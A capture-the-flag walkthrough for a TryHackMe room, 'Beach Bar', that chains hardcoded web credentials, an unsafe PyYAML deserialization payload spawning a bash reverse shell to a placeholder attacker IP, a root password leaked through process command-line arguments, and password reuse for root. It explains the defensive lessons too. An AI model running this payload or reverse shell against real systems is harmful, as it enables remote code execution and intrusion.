# TryHackMe: Beach Bar — Walkthrough

**Room:** Beach Bar (Hacker Holidays — Day 05, The Byte Lotus Hotel)
**Category:** Boot2Root / Web
**Difficulty:** Medium

A boot2root challenge where a beachside jukebox app takes song requests — and a little more than song titles.

---

## Setting the Scene

We're guests at the Byte Lotus beach bar. The jukebox web app takes song requests from anyone with a phone, a DJ never bothers to log out, and somewhere down the boardwalk a service is quietly "announcing" something it probably shouldn't.

## 1. Reading the Room Briefing First

Before touching the target, it's worth reading the briefing carefully — this event's rooms consistently encode the intended path in the flavor text:

> "You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing 'something'. The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached."

Breaking that down line by line before scanning anything:

| Clue | Likely meaning |
|---|---|
| "A DJ who never logs out" | Hardcoded or weak credentials sitting somewhere reachable — a session/account that was never meant to be left open. |
| "A song queue that accepts a little more than song titles" | A playlist/import feature that parses more than plain data — a strong hint toward unsafe deserialization. |
| "A service down the boardwalk quietly announcing 'something'" | A background service (turns out to be `jukeboxd`, an audio streaming daemon) that "announces" — i.e., streams — and leaks something as a side effect. |
| "Wired straight into the floor with the trimmings still attached" | A secret left exposed somewhere it shouldn't be — command-line arguments are the classic example, since they're visible to any local user. |

Keep this table in mind — every one of these gets resolved by the end.

## 2. Web Recon & Hardcoded Credentials

Browsing to `http://<TARGET_IP>/` immediately redirects to a login page.

Opening the browser's DevTools (**F12 → Network tab**) and refreshing lets us inspect the raw HTTP response rather than the rendered page. Digging through the page source turns up hardcoded credentials sitting in plain view:

```
Username: dj
Password: dj
```

This is the "DJ who never logs out" clue, resolved — logging in with `dj:dj` drops us straight into the DJ dashboard.

**Why check the raw source instead of just the rendered page?** Browsers hide HTML comments, but they're still sitting in the document — dev tools show you exactly what the server sent, comments included. Any time a room's briefing implies "something obvious was left in," checking source/comments before anything more advanced is a cheap first move.

## 3. Mapping the Playlist Feature

Inside the DJ dashboard, an **Export Playlist** option gives us a look at the expected data format — a `.yaml` file describing tracks, artists, and metadata:

```yaml
playlist:
  name: Sunset Session
  vibe: chill
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

The dashboard also exposes an **Import** feature (`/import`) that accepts a YAML playlist back. This is the "song queue that accepts a little more than song titles" — the feature parses structured data, not just plain track names, which is exactly the shape of bug the briefing was pointing at.

## 4. Exploiting Unsafe YAML Deserialization

`/import` parses user-supplied YAML server-side. Python's YAML library (`PyYAML`) has two common ways to load YAML:

- `yaml.safe_load()` — restricted to plain data types (strings, numbers, lists, dicts). Safe.
- `yaml.load()` (without a safe `Loader`) — supports custom Python object tags like `!!python/object/apply`, which can be abused to call **arbitrary Python functions** — including `os.system` — during deserialization.

If the import feature uses the unsafe variant, we can smuggle a function call into what looks like ordinary playlist metadata.

**Step 1 — start a listener on the attack box:**
```bash
nc -lvnp 4444
```

**Step 2 — craft a malicious playlist payload.** The trick is placing the payload in a field that gets deserialized but isn't strictly validated — here, the `vibe` field:

```yaml
# Beach Bar malicious playlist
playlist:
  name: Sunset Session
  vibe: !!python/object/apply:os.system
    - "bash -c 'bash -i >& /dev/tcp/YOUR_THM_IP/4444 0>&1'"
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

`!!python/object/apply:os.system` tells the unsafe YAML loader: "construct this by calling `os.system(...)` with the following argument." The argument is a standard bash reverse shell one-liner.

**Step 3 — submit it via the Import page.** Pasting the payload into the Import text box and clicking **Load** triggers server-side deserialization — and with it, our payload.

## 5. Catching the Shell & Grabbing the User Flag

The netcat listener catches a connection almost immediately, landing as `bartender` — the service account gunicorn runs the Flask app under:

```
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

Locate and read the user flag:
```bash
find /home /var/www /opt -name "user.txt" 2>/dev/null
cat /home/bartender/user.txt
```

## 6. Post-Exploitation Enumeration

With a shell as `bartender`, it's time to hunt for a privesc path.

**Processes:**
```bash
ps -ef
```

⚠️ **A mistake worth flagging explicitly:** an early pass at this filtered the process list with `grep -v 'root'`, intending to focus on non-root processes as "more likely to be exploitable." That filter accidentally hid the single most important process on the box. **Never filter out root-owned processes when hunting for privesc** — root processes are exactly the ones worth inspecting, since anything they leak (env vars, command-line args, writable files they touch) is a direct path to escalation.

**Systemd units & scheduled tasks:**
```bash
ls -la /etc/systemd/system/
cat /etc/crontab
```

A `badr.service` unit stood out — root-owned, referencing binaries and YAML configs under `/etc/badr/`, with a self-deleting `ExecStartPost` step:

```ini
[Unit]
Description=Badr Service
Wants=network-online.target
After=network-online.target

[Service]
Type=simple
ExecStartPre=/bin/chmod +x /etc/badr/badr
ExecStart=/etc/badr/badr --config /etc/badr/rules.yaml --config /etc/badr/room.config.yaml > /var/log/badr.log 2>&1
ExecStartPost=/bin/bash -c 'sleep 10 && rm -f /etc/badr/badr /etc/badr/config.yaml /etc/badr/rules.yaml /etc/badr/room.config.yaml'
TimeoutSec=60
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

This looked like a natural extension of the same YAML-deserialization theme from the web app, and was tempting to chase. **It turned out to be a deliberate red herring:**
- `badr.service` only fires once at boot — there's no timer to trigger it again.
- `bartender` has no permission to `systemctl start` it (`Interactive authentication required`).
- No polkit rules grant an exception.

Worth including here specifically because it's a realistic dead end — plausible-looking, thematically consistent, and still wrong. Don't sink too much time into a lead just because it *looks* like it fits the theme; confirm you can actually act on it before going deeper.

## 7. Finding the Real Leak — "Trimmings Still Attached"

Back to the briefing: a service "announcing something" with "the trimmings still attached." That points at `jukeboxd`, an audio streaming daemon whose source is sitting right there on disk:

```bash
cat /opt/beach-bar/jukeboxd/jukeboxd.py
```

```python
#!/usr/bin/env python3
import argparse
import time

NOW_PLAYING = [
    "Khruangbin - Maria Tambien",
    "Men I Trust - Show Me How",
    "Crumb - Locket",
    "Mac DeMarco - Chamber of Reflection",
]

def main():
    parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
    parser.add_argument("--stream-pass", required=True, help="stream backend password")
    parser.add_argument("--bitrate", default="320k")
    args = parser.parse_args()
    ...

if __name__ == "__main__":
    main()
```

The script itself is harmless — but it takes a `--stream-pass` argument at startup. On Linux, **command-line arguments passed to any process are visible to every local user** via `/proc/<pid>/cmdline` (and by extension, `ps -ef`), unless `hidepid` has been configured on `/proc` to restrict this. This box wasn't locked down that way.

That's the "trimmings still attached": a secret that belongs in a config file, environment variable, or secrets manager was instead wired directly into the process invocation — in full view of `ps -ef`.

Checking the process list **without filtering anything out** this time:
```bash
ps -ef | grep -i jukebox
```
```
root   608   1  0 11:07 ?  00:00:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

A root-owned process, leaking a plaintext password straight through its command line.

## 8. Credential Reuse → Root

With a leaked password in hand, the natural next move is checking whether it's been reused anywhere — starting with the most valuable account on the box:

```bash
su root
Password: [the leaked --stream-pass value]
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```

Root access confirmed. The "stream backend password" turned out to double as the actual root account password — classic credential reuse, and a fitting final twist for a room built around things being left exactly where they shouldn't be.

Grab the final flag:
```bash
cat /root/root.txt
```

---

## Summary of the Chain

| Stage | Technique | Result |
|---|---|---|
| Recon | DevTools → view raw HTTP source | Hardcoded `dj:dj` credentials found |
| Access | Login with hardcoded creds | DJ dashboard access |
| Foothold | Unsafe PyYAML deserialization via `/import` (`!!python/object/apply:os.system`) | RCE → shell as `bartender` → user flag |
| Red herring | `badr.service` systemd unit | Looked promising, but unreachable — not the intended path |
| Real leak | Root process command-line arguments exposed via `ps -ef` / `/proc/<pid>/cmdline` | Plaintext `--stream-pass` password recovered |
| Privilege escalation | Password reuse on the root account (`su root`) | Full root access → root flag |

**Key takeaway:** this room punishes tunnel vision in two directions — first toward `badr.service` (thematically tempting but a dead end), and second toward over-filtering `ps -ef` output. The real leak was sitting in plain sight the whole time, exactly as the briefing promised: "wired straight into the floor with the trimmings still attached."

*(Flags intentionally redacted from this writeup — re-run the steps above against your own instance to obtain them.)*
